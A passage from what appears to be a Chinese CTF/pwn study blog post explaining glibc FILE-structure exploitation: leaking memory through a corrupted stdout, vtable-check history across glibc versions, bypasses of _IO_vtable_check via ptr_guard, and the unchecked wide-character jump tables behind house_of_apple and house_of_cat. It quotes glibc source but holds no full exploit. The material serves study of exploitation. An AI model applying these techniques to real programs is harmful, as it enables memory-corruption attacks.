需要注意的是，若是用此方法改<code>stdout</code>来泄露相关信息，也可以不改<code>_flags</code>，如假设有漏洞可以修改一个堆块的<code>size</code>，那么可以构造<code>_IO_read_end</code>等于<code>_IO_write_base</code>来进行绕过，具体方式是：改了<code>global_max_fast</code>后，先释放一个需要泄露其中内容的<code>fake fast bin</code>到<code>_IO_read_end</code>（此时，正常走<code>IO</code>指针的输出均会失效，因为过不了<code>_IO_read_end = _IO_write_base</code>的判断，就不会执行<code>_IO_SYSWRITE</code>），然后修改该<code>fake fast bin</code>的<code>size</code>，再将其释放到<code>_IO_write_base</code>处即可。
利用此方法，也可以对<code>libc</code>进行泄露，毕竟在算<code>index</code>的时候，<code>libc_base</code>是被抵消掉的，或者说，是可以泄露在<code>fastbinsY</code>之后的数据。泄露的思想就是：当<code>free</code>时，会把此堆块置入<code>fastbin</code>链表的头部，所以在<code>free</code>后，此堆块的<code>fd</code>位置的内容，就是<code>free</code>前此<code>SIZE</code>的链表头部指针，通过越界就可以读取<code>LIBC</code>上某个位置的内容。</p>
<h1 id="虚表检测">🔍虚表检测
</h1><p>虚表检测是2.24之后加入的内容，<code>IO_validate_vtable</code>检测如果虚表超出范围就进入<code>_IO_vtable_check</code>函数。各路大神找到的<code>house</code>很多都不是打<code>file</code>的跳表，而是其他处理跳表，但都差不太多。简要梳理如下。</p>
<blockquote>
<p>(1) 2.23 的没有任何限制，可以将<code>vtable</code> 劫持在堆上并修改其内容，然后触发FSOP</p>
<p>(2) 2.24 引入了<code>vtable check</code>，使得将<code>vtable</code> 整体劫持到堆上已不可能，大佬发现可以使用内部的<code>vtable</code>中<code>_IO_str_jumps</code>或<code>_IO_wstr_jumps</code>来进行利用。</p>
<p>(3) 2.31 中将<code>_IO_str_finish</code>函数中强制执行<code>free</code>函数，导致无法使用上述问题，因而催生出其他调用链。</p>
</blockquote>
<h2 id="虚表范围">虚表范围
</h2><p>虚表位置判断主要在<code>IO_validate_vtable</code>函数，<strong>2.37以前</strong>判断区间为<code>_IO_helper_jumps - _IO_str_jumps</code>之间的区域 0xd60，里面有以下虚表。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">_IO_helper_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_old_helper_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_cookie_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_proc_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_str_chk_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_wstrn_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_wstr_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_wfile_jumps_maybe_mmap</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_wfile_jumps_mmap</span>
</span></span><span class="line"><span class="cl"><span class="n">__GI__IO_wfile_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_wmem_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_mem_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_strn_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_obstack_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_file_jumps_maybe_mmap</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_file_jumps_mmap</span>
</span></span><span class="line"><span class="cl"><span class="n">__GI__IO_file_jumps</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_str_jumps</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="攻击_io_vtable_check">攻击<code>_IO_vtable_check</code>
</h2><p>在<code>IO_validate_vtable</code>函数检查如果虚表超出范围，会进入<code>_IO_vtable_check</code>函数，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">attribute_hidden</span> <span class="nf">_IO_vtable_check</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef SHARED
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="cm">/* Honor the compatibility flag.  */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">flag</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="nf">atomic_load_relaxed</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">IO_accept_foreign_vtables</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef PTR_DEMANGLE
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="nf">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">flag</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">_IO_vtable_check</span><span class="p">)</span> <span class="c1">//检查是否是外部重构的vtable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里就很有意思，也就是说GNU其实也同意你能够外部重构<code>vtable</code>，只是要满足一定条件。那么我们还是可以绕过虚表检测的。</p>
<blockquote>
<ol>
<li>泄露<code>ptr_guard</code>，反算<code>IO_accept_foreign_vtables</code>然后修改。</li>
<li>因为<code>IO_accept_foreign_vtables</code>中基本都是0，直接将<code>ptr_guard</code>修改为<code>&amp;_IO_vtable_check</code>也可以。</li>
</ol>
</blockquote>
<p>但无论如何我们都需要有ld文件。</p>
<h2 id="外置虚表">外置虚表
</h2><p><code>check_stdfiles_vtables</code>函数是设置外置虚表的函数，如果能执行这个函数，也可以绕过虚表检测</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span>  <span class="nf">check_stdfiles_vtables</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_2_1_stdin_</span><span class="p">.</span><span class="n">vtable</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps</span>
</span></span><span class="line"><span class="cl">      <span class="o">||</span> <span class="n">_IO_2_1_stdout_</span><span class="p">.</span><span class="n">vtable</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps</span>
</span></span><span class="line"><span class="cl">      <span class="o">||</span> <span class="n">_IO_2_1_stderr_</span><span class="p">.</span><span class="n">vtable</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">IO_set_accept_foreign_vtables</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">_IO_vtable_check</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="宽字符跳表">🧭宽字符跳表
</h1><p>将宽字符函数调用单独拿出来主要是因为，目前（2.36及以前，2.37也没有修订）宽字符跳表的引用没有加入保护，<code>house_of_apple house_of_cat</code>都是利用这一点。</p>
<p>以2.36为例，目前，涉及到宽字符跳转的函数一共有19个，也就是说跳表中的都定义了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WUNDERFLOW(FP) WJUMP0 (__underflow, FP)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WUFLOW(FP) WJUMP0 (__uflow, FP)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WPBACKFAIL(FP, CH) WJUMP1 (__pbackfail, FP, CH)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WXSPUTN(FP, DATA, N) WJUMP2 (__xsputn, FP, DATA, N)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSEEKOFF(FP, OFF, DIR, MODE) WJUMP3 (__seekoff, FP, OFF, DIR, MODE)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSEEKPOS(FP, POS, FLAGS) WJUMP2 (__seekpos, FP, POS, FLAGS)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSETBUF(FP, BUFFER, LENGTH) WJUMP2 (__setbuf, FP, BUFFER, LENGTH)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSYNC(FP) WJUMP0 (__sync, FP)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSYSREAD(FP, DATA, LEN) WJUMP2 (__read, FP, DATA, LEN)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSYSWRITE(FP, DATA, LEN) WJUMP2 (__write, FP, DATA, LEN)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSYSSEEK(FP, OFFSET, MODE) WJUMP2 (__seek, FP, OFFSET, MODE)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSYSCLOSE(FP) WJUMP0 (__close, FP)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSYSSTAT(FP, BUF) WJUMP1 (__stat, FP, BUF)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSHOWMANYC(FP) WJUMP0 (__showmanyc, FP)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WIMBUE(FP, LOCALE) WJUMP1 (__imbue, FP, LOCALE)
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>但实际上有引用的仅为以下4个</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WUFLOW(FP) WJUMP0 (__uflow, FP)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WSETBUF(FP, BUFFER, LENGTH) WJUMP2 (__setbuf, FP, BUFFER, LENGTH)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>其中，<code>_IO_WSETBUF</code>仅用在<code>_IO_setbuffer</code>中，也就是我们经常用的<code>setbuf</code></p>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/markdown/">Markdown</a>
        
            <a href="/tags/pwn/">Pwn</a>
        
            <a href="/tags/io/">IO</a>
        
            <a href="/tags/%E5%91%A8%E6%8A%A5/">周报</a>
        
    </section>


    </footer>


    
</article>

    

    

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2026 A1ester@Luigi
    </section>
    
   
</footer>

<section class="count_info">
  <div>
      本站稳定运行：
      <span id="ds" class="running-days number-highlight"></span>
      天
      <span id="hs" class="running-days number-highlight"></span>
      小时
      <span id="ms" class="running-days number-highlight"></span>
      分钟
  </div>
  <div>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      共发表文章数： 
      <span class="number-highlight">2</span> 
      篇 · 总计 
      <span class="number-highlight">18.35</span> 
      k 字
  </div>
  <div>
      <span id="busuanzi_container_site_pv">
          本站总访问量：
          <span id="busuanzi_value_site_pv" class="number-highlight"></span>
          次
      </span>
  </div>
</section>


<script>
let s1 = '2026-02-08'; 
s1 = new Date(s1.replace(/-/g, "/"));
let s2 = new Date();
let timeDifference = s2.getTime() - s1.getTime();

let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));


const ds = document.getElementById('ds');
const hs = document.getElementById('hs');
const ms = document.getElementById('ms');

ds.innerHTML = days;
hs.innerHTML = hours;
ms.innerHTML = minutes;


ds.classList.add('number-highlight');
hs.classList.add('number-highlight');
ms.classList.add('number-highlight');


const busuanziValue = document.getElementById('busuanzi_value_site_pv');
if (busuanziValue) {
    busuanziValue.classList.add('number-highlight');
}
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
<script>
  const cdnPath = "https://cdn.meimolihan.eu.org/hugo/live2d";
  

  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/live2d-moc3/",
      cssPath: cdnPath + "/waifu.css",
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express", "switch-model", "switch-texture", "photo", "info", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

<div id="toast-stack"></div>

<script>
 
(() => {
  const toastStack = document.getElementById('toast-stack');
  let toastCount = 0;
  const MAX_TOAST = 5;
  const DURATION  = 2500;

   
  let lastText = '';
  let lastTime = 0;

  window.pushToast = function (msg = '✅ 哎嘿！复制成功了😊') {
    const now = Date.now();
    if (msg === lastText && now - lastTime < 500) return; 
    lastText = msg;
    lastTime = now;

     
    if (toastCount >= MAX_TOAST) toastStack.firstElementChild?.closeToast();

    const item = document.createElement('div');
    item.className = 'snack-left-top';
    item.textContent = msg;

    let closeTimer = null;
    function closeToast() {
      if (item.isClosing) return;
      item.isClosing = true;
      item.classList.remove('show');
      item.addEventListener('transitionend', () => {
        item.remove();
        toastCount--;
      }, { once: true });
      clearTimeout(closeTimer);
    }
    item.closeToast = closeToast;

    toastStack.appendChild(item);
    toastCount++;
    void item.offsetWidth;
    item.classList.add('show');
    closeTimer = setTimeout(closeToast, DURATION);
  };

   
  document.addEventListener('copy', e => {
    const text = window.getSelection().toString().trim();
    if (!text) return;
    e.preventDefault();
    navigator.clipboard.writeText(text)
      .then(() => pushToast())
      .catch(console.warn);
  });

   
  const container = document.querySelector('.article-content');
  if (container) {
    container.addEventListener('click', e => {
      if (!e.target.matches('.copyCodeButton')) return;
      const wrap = e.target.closest('pre, .highlight');
      const codeTd = wrap?.querySelector('td:nth-child(2)') || wrap;
      const txt = codeTd ? codeTd.textContent.trim() : '';
      navigator.clipboard.writeText(txt)
        .then(() => pushToast())
        .catch(err => alert('复制失败：' + err));
    });
  }
})();
</script>

<style>
 
.copyCodeButton {
  position: absolute;
  top: 8px;
  right: 8px;
  border-radius: 4px;
  border: 1px solid #333;
  background: #3ff8ab;
  color: #08f9ad;
  padding: 4px 8px;
  font-size: 12px;
  cursor: pointer;
  transition: background .2s;
}
.copyCodeButton:hover {
  background: #03b281 !important;;
  color: #f2f5f4;
}

 
.snack-left-top {
  position: fixed;
  left: 20px;
  top: calc(20px + env(safe-area-inset-top, 0px));
  transform: translateX(calc(-100% - 20px));
  width: 300px;
  height: 60px;
  padding: 0;
  margin: 0;
  border: none;
  border-radius: 15px;
  background: var(--hover-text-color);
  color: #00ae5d;
  box-shadow: 4px 4px 14px rgba(2, 250, 204, 0.35);
  z-index: 9999;
  font-size: 18px;
  font-weight: bold;
  display: flex;
  align-items: center;
  justify-content: center;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  transition: transform .35s cubic-bezier(.4, 0, .2, 1);
}
 
.snack-left-top.show {
  transform: translateX(0);
}
 
#toast-stack {
  position: fixed;
  left: 0;
  top: calc(20px + env(safe-area-inset-top, 0px));
  z-index: 9999;
  pointer-events: none;
}

 
#toast-stack .snack-left-top {
  position: relative;    
  margin-bottom: 12px;   
  pointer-events: auto;
  transition: transform .35s cubic-bezier(.4, 0, .2, 1),
              opacity   .35s cubic-bezier(.4, 0, .2, 1);
  opacity: 0;
  transform: translateX(calc(-100% - 20px));
}

#toast-stack .snack-left-top.show {
  opacity: 1;
  transform: translateX(0);
}
</style>

<div id="jsi-flying-fish-container"></div>


<style>
#jsi-flying-fish-container {
    position: fixed;
    left: 0;
    bottom: 0;
    width: 100%;
    height: 120px;
    z-index: -1;
    opacity: 0;           
    overflow: hidden;
    pointer-events: none;
    transition: opacity .3s;
}
 
.show-fish #jsi-flying-fish-container {
    opacity: .5;
}
</style>


<script>
window.initFlyingFish = function () {
    const container = document.getElementById('jsi-flying-fish-container');
    if (!container) return;

     
    const oldCanvas = container.querySelector('canvas');
    if (oldCanvas) oldCanvas.remove();

     
    const script = document.createElement('script');
    script.src = 'https://cdn.meimolihan.eu.org/hugo/fish/fish.js';
    script.onload = function () {
        if (typeof RENDERER !== 'undefined') RENDERER.init();
    };
    document.head.appendChild(script);

     
    function checkBottom() {
        const doc = document.documentElement;
        const isBottom = (window.innerHeight + Math.ceil(window.pageYOffset))
                         >= (doc.scrollHeight - 10);
        document.body.classList.toggle('show-fish', isBottom);
    }

     
    window.addEventListener('scroll', checkBottom);
    checkBottom(); 
};

 
document.addEventListener('DOMContentLoaded', initFlyingFish);

 
document.addEventListener('pjax:complete', initFlyingFish);
</script>
 <script defer src="https://cn.vercount.one/js"></script>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>



<div id="particles-js"></div>

<script src=https://A1ester.github.io/background/particles.min.js></script>
<script>
  particlesJS.load('particles-js', "https://A1ester.github.io/background/particlesjs-config.json", function() {
    console.log('particles.js loaded - callback');
  });
</script>

<style>
  #particles-js {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: -1;
  }
</style>
    </body>
</html>
